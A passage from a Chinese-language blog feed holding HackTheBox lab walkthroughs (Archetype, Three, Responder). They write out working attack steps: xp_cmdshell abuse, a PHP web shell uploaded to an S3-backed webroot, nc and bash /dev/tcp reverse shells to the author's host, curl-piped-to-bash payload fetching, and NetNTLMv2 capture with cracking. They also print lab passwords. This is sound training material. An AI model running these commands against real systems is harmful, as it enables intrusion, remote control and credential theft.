以匿名身份登录，不需要密码。</span><br><span class="hljs-meta">#-L : 列出目标主机上的所有共享资源。</span><br><span class="hljs-meta"># `<span class="hljs-comment">//` 明确指出你要访问的是网络共享，而不是本地路径。</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217105806.png"></p><p>尝试访问 backups：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">10.129.111.223</span>/backups<br></code></pre></td></tr></table></figure><p>输入 dir 命令列出当前目录中的文件和文件夹：</p><p><img src="/../images/Pasted%20image%2020241217110650.png"></p><p> prod.dtsConfig 看起来像是一个配置文件。使用 get 命令将其下载到本地计算机：</p><p><img src="/../images/Pasted%20image%2020241217110859.png"></p><p>文件内容如下:</p><p><img src="/../images/Pasted%20image%2020241217111114.png"></p><p>我们发现了主机 ARCHETYPE 上用户 sql_svc 的密码。接下来尝试连接 MSSQL 服务器。</p><p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>工具中的 <strong>mssqlclient.py</strong> 可以提供此服务：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py ARCHETYPE/sql_svc@<span class="hljs-number">10.129.111.223</span> -windows-auth<br></code></pre></td></tr></table></figure><p>成功连接Microsoft SQL Server：</p><p><img src="/../images/Pasted%20image%2020241217123244.png"></p><p>有关 MSSQL Server 的渗透技巧可以看这篇文章： <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p><p>默认情况下，<code>xp_cmdshell</code> 被禁用，因为它允许执行操作系统命令，这可能带来安全风险。所以首先需要启用 <code>xp_cmdshell</code> ：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Check</span> <span class="hljs-keyword">if</span> xp_cmdshell <span class="hljs-keyword">is</span> enabled<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;<br><br># This turns <span class="hljs-keyword">on</span> advanced <span class="hljs-keyword">options</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> needed <span class="hljs-keyword">to</span> configure xp_cmdshell<br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br><br><span class="hljs-meta">#This enables xp_cmdshell</span><br>sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure><p>尝试下 whoami 命令：</p><p><img src="/../images/Pasted%20image%2020241217125802.png"></p><p>因为 windows 操作系统没有内置 netcat ，所以我们要想办法让它安装一个 nc 。</p><p>首先在本机下载 nc64.exe，并在8000端口开启一个 http. server。注意把 nc64.exe放在执行 http. server 命令的目录下。</p><p><img src="/../images/Pasted%20image%2020241217132634.png"></p><p>接下来在 MSSQL Server 这边查看当前所处文件位置：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">EXEC xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br># `pwd` 是 PowerShell 的一个命令，而不是 cmd.exe 中的命令。<br># `powershell -c` 表示启动 PowerShel<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217135009.png"></p><p>作为用户 sql_svc ，没有权限在系统目录中上传文件。根据对 windows 系统的了解，可以在 <code>C:\Users\&lt;username&gt;\Downloads</code> 存放下载的文件。接下来在这个文件夹下，执行下载 nc64.exe 的命令：</p><figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.8:8000/nc64.exe&quot;</span><br></code></pre></td></tr></table></figure><p>由于对命令行工具的不熟悉，这里一开始用的是 curl 命令。后面无法执行反弹 shell ，发现Downloads 文件夹内没有 nc64.exe。改为 wget 命令后成功下载。</p><ul><li>区别：<ul><li>**<code>wget</code>**：会根据 URL 自动保存文件。可以使用 <code>-O</code> 参数指定保存的文件名。</li><li>**<code>curl</code>**：默认输出内容到终端，如果要将下载的文件保存到本地，需要使用 <code>-O</code>  参数。</li><li>如果只是需要下载文件，**<code>wget</code>** 是更好的选择。</li><li>如果需要与服务器进行更复杂的交互，发送 HTTP 请求、处理表单数据、上传文件等，**<code>curl</code>** 更适合。</li></ul></li></ul><p>在 http.server 处看到目标服务器已经执行了这个命令。</p><p><img src="/../images/Pasted%20image%2020241217141433.png"></p><p>接下来就是常规的反弹 shell 了。</p><p>本机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标服务器执行以下命令，通过 nc 将 cmd.exe 绑定到我们的监听端口：</p><figure class="highlight dos"><table><tr><td class="code"><pre><code class="hljs dos">EXEC xp_cmdshell &quot;powershell -c <span class="hljs-built_in">cd</span> C:\Users\sql_svc\Downloads; .\nc64.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span> <span class="hljs-number">8888</span>&quot;<br></code></pre></td></tr></table></figure><p>在用户的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217152043.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来需要找到管理员的 flag，涉及到 Windows 权限提升，可以利用工具<a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。</p><p>将 winPEASx64.exe 下载到目标服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 本机：</span><br><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br><br><span class="hljs-comment"># 目标服务器首先执行 PoweShell ，然后执行 wget 命令：</span><br><span class="hljs-attribute">powershell</span> <br><span class="hljs-attribute">Invoke</span>-WebRequest -Uri http://<span class="hljs-number">10.10.16.8:8000</span>/winPEASx64.exe -O <span class="hljs-string">&quot;winPEASx64.exe&quot;</span> -UseBasicParsing<br></code></pre></td></tr></table></figure><p>这里尝试了 wget ，curl 和PowerShell 自带的 <code>Invoke-WebRequest</code>都失败了，错误提示：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">wget : The response content cannot be parsed because <span class="hljs-keyword">the</span> Internet Explorer engine <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">or</span> Internet Explorer&#x27;s <span class="hljs-keyword">first</span>-<span class="hljs-built_in">launch</span> configuration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> complete. Specify <span class="hljs-keyword">the</span> UseBasicParsing parameter <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> again.<br></code></pre></td></tr></table></figure><p>这是因为在 PowerShell 中，默认使用 Internet Explorer（IE）作为内容解析引擎，但在某些环境中，IE 可能不可用或没有完全配置。这导致无法解析下载的内容。PowerShell 7 以上版本通常不再依赖于 IE 引擎。</p><p>解决办法是使用<code>-UseBasicParsing</code> 参数，让 PowerShell 使用基本的 HTML 解析方式，而不是依赖 IE 引擎。</p><p>执行 <strong>winPEASx64.exe</strong>：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">PS C:<span class="hljs-string">\Users\sql_svc\Downloads&gt;</span> .<span class="hljs-string">\winPEASx64.exe</span><br></code></pre></td></tr></table></figure><p>从输出的报告可以看到：</p><p><img src="/../images/Pasted%20image%2020241217175322.png"></p><p>当前用户拥有[ SeImpersonatePrivilege 权限](<a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege and SeCreateGlobalPrivilege - Windows Server | Microsoft Learn</a>)。这个权限可能被 [Juicy Potato](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">多汁土豆 |黑客技巧 — JuicyPotato | HackTricks</a>)利用。此处待日后展开讨论。</p><p>由于当前是一个普通用户账户，同时也是一个服务账户（为某些服务或应用程序运行而创建的账户），因此值得检查一下是否有经常访问的文件或执行的命令。</p><p>在 Windows 系统中，PowerShell 会记录用户执行的命令历史，类似于 Linux 中的 <code>.bash_history</code>。历史记录文件 <strong>ConsoleHost_history.txt</strong> 存储在 <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</code> 目录下。</p><p>查看这个文件，我们以明文形式获得了管理员用户的密码，该密码为 MEGACORP_4dm1n！！</p><p><img src="/../images/Pasted%20image%2020241217181120.png"></p><p>因为目标主机并没有开放ssh端口，此时我们可以再次使用 Impacket 工具中的 <strong>psexec.py</strong> 工具，以管理员身份获取 shell。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">10.129.111.223</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241217182129.png"></p><p>在管理员的 Desktop 文件找到 flag：</p><p><img src="/../images/Pasted%20image%2020241217182813.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场是目前三个里面花的时间最长的，因为涉及到权限提升，不仅要找到用户 flag，还要找到管理员 flag 。实际上，这个过程中并没有涉及到 Windows 权限提升，而是通过记录 PoweShell 的文件找到了管理员的密码。关于权限提升，目前是一窍不通，以后遇到相关靶场再详细记录。通过三个靶场的练习，一些重复的知识我已经完全掌握了。这是一个良好的开端，日后会坚持刷题的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;通过这篇博客，你会了解到 SMB 协议、smbclient </summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Three</title>
    <link href="http://example.com/2024/12/14/Hack%20The%20Box-Three/"/>
    <id>http://example.com/2024/12/14/Hack%20The%20Box-Three/</id>
    <published>2024-12-14T04:52:06.000Z</published>
    <updated>2024-12-14T15:02:39.473Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在信息收集过程中，使用 gobuster 爆破子域名，发现该网站使用 AWS S3 bucket作为其云存储设备。利用配置不当的 S3 bucket，上传后门到网站根目录。在本地主机编写一个反弹shell脚本，启动一个 Web 服务器并开启一个监听端口。然后浏览器访问相应的 URL，让目标主机获取并执行反弹shell，最终获取目标主机的控制权。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先，nmap扫描开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.160.174</span><br></code></pre></td></tr></table></figure><p>发现操作系统是Linux，有两个端口开放：22(ssh)和80(http):</p><p><img src="/../images/Pasted%20image%2020241214131020.png"></p><p>访问 <a href="http://10.129.27.203/">http://10.129.27.203</a> :</p><p><img src="/../images/Pasted%20image%2020241214131419.png"></p><p>contact页面发现一个子域名：</p><p><img src="/../images/Pasted%20image%2020241214131643.png"></p><p>通常，不同的子域名会对应不同的 IP 地址。但是也可以由同一台服务器处理多个子域名。这种情况下，服务器通过 HTTP 请求中的 <code>Host</code> 头来确定应该由哪个应用程序处理该请求。现在我们有域名thetoppers.htb ，接下来尝试寻找同一服务器的其他子域名。</p><p>主机在向 DNS 服务器查询前，会先检查本地 hosts 文件中是否已存在目标主机名的映射关系。所以我们首先需要通过 <code>/etc/hosts</code> 将 thetoppers.htb 手动映射到靶机的 IP 地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><ul><li><strong>gobuster</strong><ul><li>基本用法：<ol><li>目录爆破：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code></li><li>子域名爆破：<code>gobuster dns -d example.com -w /path/to/wordlist.txt</code></li><li>虚拟主机枚举：<code>gobuster vhost -u http://example.com -w /path/to/wordlist.txt</code></li><li>S3 存储桶枚举：<code>gobuster s3 -w /path/to/wordlist.txt</code></li><li>自定义头部：<code>gobuster dir -u http://example.com -w /path/to/wordlist.txt -H &quot;Authorization: Bearer TOKEN&quot;</code></li></ol></li><li>dns 模式只能通过 DNS 记录来发现子域名，如果目标服务器没有配置 DNS 记录，或者目标子域没有公开的 DNS 记录，那么使用 dns 模式就无法发现这些子域。</li><li>vhost 模式通过尝试发送多个带有不同 Host 头的 HTTP 请求来模拟访问不同的虚拟主机，目的是查找由同一 IP 地址托管的多个虚拟主机（子域）。</li></ul></li></ul><p>接下来使用 gobuster 爆破子域名：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gobuster vhost -u http://thetoppers.htb -w Desktop/fuzzDicts/subdomainDicts/main.txt<br></code></pre></td></tr></table></figure><p>结果显示存在一个名为 s3.thetoppers.htb 的子域名，在 &#x2F;etc&#x2F;hosts 文件中为此子域名也添加一个条目：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.27.203 s3.thetoppers.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br></code></pre></td></tr></table></figure><p>访问这个子域名：</p><p><img src="/../images/Pasted%20image%2020241214175016.png"></p><p>Amazon S3 是一种基于云的对象存储服务（OSS），它使用 buckets 作为存储容器，类似于文件夹。使用场景包括备份和存储、媒体托管、软件交付、静态网站托管等。我们可以借助 <strong>awscli</strong> 与 S3 buckets进行交互。 </p><p>首先，设置其所有字段为任意值：</p><p><img src="/../images/Pasted%20image%2020241214175627.png"></p><p>使用 ls 命令列出服务器托管的所有 S3 buckets：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214175904.png"></p><p>然后查看指定 bucket 内的对象和公共前缀（PRE，类似文件夹）：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span> s3:<span class="hljs-string">//thetoppers.htb</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214180409.png"></p><p>在 thetoppers.htb 这个bucket内，我们看到了一个名为 &#x2F;images的文件夹，一个.htaccess(Apache 服务器的配置文件)和一个index.php，这符合网站根目录的文件结构。</p><p>awscli 允许上传文件到 S3 bucket，我们随意上传一个文件作测试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/hash.txt s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214183505.png"></p><p>浏览器访问 <a href="http://thetoppers.htb/hash.txt%EF%BC%9A">http://thetoppers.htb/hash.txt：</a></p><p><img src="/../images/Pasted%20image%2020241214185221.png"></p><p>发现上传到 S3 bucket的文件成功在浏览器上被显示出来了，由此分析该S3 bucket被用作网站的 <code>webroot</code>。根据这个漏洞，我们可以上传后门，获取网站的控制权。</p><p>我的Wappalyzer没分析出来网站用的什么编程语言，官方题解说是 PHP 。于是写一个 php 一句话木马：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入 shell.php 文件：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>上传 shell.php:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> Desktop/shell.php s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214184556.png"></p><p>这里在浏览器访问文件失败。查看 shell.php，发现文件内容变为：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>原因是 shell 对双引号内的内容会进行变量解析，而 <code>$_GET[&quot;cmd&quot;]</code> 被解释为一个尚未定义的变量（空值）。解决办法是将双引号改成单引号，单引号内部的内容不会被解析，因此可以正确保留 <code>$_GET[&quot;cmd&quot;]</code>：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span><br></code></pre></td></tr></table></figure><p>尝试使用 URL 参数 cmd 执行 OS 命令 id :</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">http://thetoppers.htb/shell.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241214190212.png"></p><p>证明已经成功上传后门。接下来就要想办法获取目标主机的控制权。</p><p>在实际场景中，很多内网机器并没有对外开放的端口供连接。而且目标主机通常位于受防火墙保护的内网环境中，无法直接通过正向连接访问。但目标机器可以主动发起出站连接，因为出站流量通常允许通过防火墙。这时就要用到反弹 shell 了。</p><p>创建一个 shell.sh，使用<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a>一键生成（一开始用的nc，失败了）：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.10.16.8</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>本地主机开放8888端口监听：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>在本地主机 8000 端口上启动一个 Web 服务器：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>在浏览器上使用 curl 命令从本地主机获取 shell.sh，然后将其通过管道传输到 bash 以执行它：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://thetoppers.htb/<span class="hljs-built_in">shell</span>.php?cmd=curl <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.8</span>:<span class="hljs-number">8000</span>/<span class="hljs-built_in">shell</span>.sh|bash<br></code></pre></td></tr></table></figure><p>成功下载：</p><p><img src="/../images/Pasted%20image%2020241214223216.png"></p><p>监听端口显示连接成功，找到flag：</p><p><img src="/../images/Pasted%20image%2020241214223155.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这次靶场练习中，最大的收获是实际操作了以前学过的知识，比如上传后门和反弹shell。除此之外，又认识了一个渗透神器 gobuster，还了解了OSS，之前只听说过，但是没遇到过。在整个过程中，相对于以前的刷题过程，我多了些思考，并通过Chatgpt解决了疑惑，但是对一些命令还是不够熟练，以后再接再厉。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在信息收集过程中，使用 gobuster 爆破子域名，发现该</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Responder</title>
    <link href="http://example.com/2024/12/13/Hack%20The%20Box-Responder/"/>
    <id>http://example.com/2024/12/13/Hack%20The%20Box-Responder/</id>
    <published>2024-12-13T09:56:20.000Z</published>
    <updated>2024-12-17T07:19:50.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>本篇博客演示了文件包含漏洞的利用，包括本地文件包含和远程文件包含，并介绍了 SMB 协议和 Windows 操作系统的 NTLM 协议。除此之外，使用 Responder 工具来获取 NetNTLMv2 哈希值，并使用 John The Ripper  测试数百万个可能的密码，找到正确的管理员密码。最后，使用 Evil-WinRM 获取目标主机权限。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>首先使用 Nmap 扫描目标主机的开放端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p- --min-rate <span class="hljs-number">1000</span> -sV <span class="hljs-number">10.129.95.234</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213174908.png"></p><p>根据 Nmap 扫描的结果，发现该机器使用 Windows 操作系统。检测到两个端口处于打开状态。</p><p>打开 Firefox 并输入 <code>http://10.129.95.234</code>  时，网站重定向到 <code>http://unika.htb</code>。由于主机不知道如何解析 <code>unika.htb</code>（即无法将其转换为对应的 IP 地址），导致浏览器显示“无法找到该网站”的错误。</p><p><code>/etc/hosts</code> 文件用于将主机名解析为IP地址，因此我们需要在 &#x2F;etc&#x2F;hosts 文件中为该域添加一个条目，以使浏览器能够解析 unika.htb 的地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.95.234   unika.htb&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> -a /etc/hosts<br>//tee,同时写入到文件和屏幕<br>//-a,追加写入<br></code></pre></td></tr></table></figure><p>添加该条目后，访问 <code>unika.htb</code> 将直接解析为 <code>10.129.95.234</code>，无需通过外部 DNS 服务器。</p><p>刷新页面：</p><p><img src="/../images/Pasted%20image%2020241213180811.png"></p><p>编程语言是php：</p><p><img src="/../images/Pasted%20image%2020241213182532.png"></p><p>导航栏点击到 EN 时，URL 发生变化：</p><p><img src="/../images/Pasted%20image%2020241213180924.png"></p><p>页面是由 page 参数加载的，该参数可能受到<strong>文件包含</strong>漏洞的攻击。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>测试 page 参数，检查是否可以在服务器响应中包含目标系统上的文件。在Windows系统上，渗透测试可能尝试访问的最常见文件之一是 hosts 文件，路径为：  </p><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">WINDOWS\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p>使用目录穿越，逐步回退到根目录：</p><p><img src="/../images/Pasted%20image%2020241213182119.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>在 <code>php.ini</code> 配置文件中，<code>allow_url_include</code> 默认设置为 “Off”，表示 PHP 不会加载远程 HTTP 或 FTP URL，以防止远程文件包含攻击。然而，即使 <code>allow_url_include</code> 和 <code>allow_url_fopen</code> 设置为 “Off”，PHP 仍然可能允许 SMB URL 加载。</p><p>如果加载SMB URL ，Windows 将尝试进行身份验证，我们可以通过截取 NetNTLMv2获取用户密码。</p><ul><li><p><strong>SMB 协议</strong>:<br> SMB (Server Message Block) 协议是一个网络文件共享协议，主要用于在计算机之间共享文件、打印机和其他资源。它允许网络中的设备进行交互，例如访问文件系统、读取文件、写入文件以及与网络设备通信。</p></li><li><p><strong>NTLM:</strong></p><ul><li>NTLM (New Technology Lan Manager)是微软为 Windows 操作系统创建的一组身份验证协议。它是一种基于 Challenge-Response 的身份验证协议，用于在 Active Directory 域上验证客户端对资源的访问。</li><li>NTLM 身份验证的工作流程：<ol><li>客户端发送用户名和域名：<br> 客户端向服务器发送用户名和域名。</li><li>服务器生成 Challenge 字符串：<br> 服务器生成一个随机字符串，称为Challenge。</li><li>客户端加密 Challenge 字符串：<br> 客户端使用用户密码的 <strong>NTLM 哈希值</strong> 对 Challenge 字符串进行加密，并将结果发送回服务器。</li><li>服务器检索用户密码或等效值：<br> 服务器从安全账户数据库中检索用户密码或等效的哈希值。</li><li>服务器验证：<br> 服务器使用检索到的哈希值对 Challenge 字符串进行加密，得到的值与客户端返回的值进行比较。如果两者匹配，客户端身份验证成功。</li></ol></li></ul></li><li><p><strong>NetNTLMv2</strong>：<br>  它是 NTLMv2 的一个扩展版本，比 NTLMv1 提供了更强的安全性。它是一个包括 Challenge 和Response 的字符串，但由于人们常常通过类似对哈希值的攻击方法来破解它，所以它又被普遍称为 NetNTLMv2 哈希。</p></li></ul><p>通过使用<a href="https://github.com/lgandx/Responder">Responder</a>工具，攻击者可以伪装成 SMB 服务器来拦截和收集 NetNTLMv2 Challenge-Response 对。</p><p>验证 Responder.conf 中侦听 SMB 请求开关是否开启：</p><p><img src="/../images/Pasted%20image%2020241213193547.png"></p><p>接下来使用 python3 启动 Responder 监听：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> Responder.<span class="hljs-keyword">py</span> -I tun0<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194021.png"></p><p>响应方服务器准备就绪后，通过设置 page 参数，告诉服务器包含来自 SMB 服务器的资源：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.6/</span>whatever <span class="hljs-comment"># 随便写一个文件名</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213194801.png"></p><p>这时看 Responder，发现显示了Administrator 帐户的 NetNTLMv：</p><p><img src="/../images/Pasted%20image%2020241213195046.png"></p><p>将这个值存储到一个文件中：</p><p><img src="/../images/Pasted%20image%2020241213195358.png"></p><p>我们将哈希文件传递给<strong>John the Ripper</strong>（一个密码哈希破解程序），破解管理员帐户的密码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john -w=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span>.txt<br></code></pre></td></tr></table></figure><p>john 会尝试给定密码列表中的每个密码，并使用该密码加密 Response。如果结果与响应匹配，则找到了正确的密码：</p><p><img src="/../images/Pasted%20image%2020241213200448.png"></p><p>从 nmap 扫描结果中，我们发现 winrm （Windows Remote Management） 服务（5985）已启用。接下来连接到目标上的 WinRM服务，并尝试获取会话。由于默认情况下 Linux 上未安装 PowerShell，因此使用 <strong>Evil-WinRM</strong> ：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.234</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241213203019.png"></p><p>最终找到flag（windows cmd.exe 用dir 查看当前文件夹下的内容，type 查看文件内容）：</p><p><img src="/../images/Pasted%20image%2020241213202816.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这是 Hack The Box 新手关卡第二阶段的第四关，明显感觉很吃力，不过收获颇丰。通过这一关，我认识了三个渗透神器：Responder 、 John The Ripper 和 Evil-WinRM 。最重要的是，对文件包含漏洞的利用有了更加深刻的理解，即使 allow_url_include 开关没开，居然也有办法执行远程文件包含。不过以上整个渗透过程，如果现在单独再操作一遍，还是无法完成。目前能力欠佳，相信通过多刷题能力提升之后，就可以复现了。再次感慨这个平台做得真好。</p>]]></content>
    
    
      
      
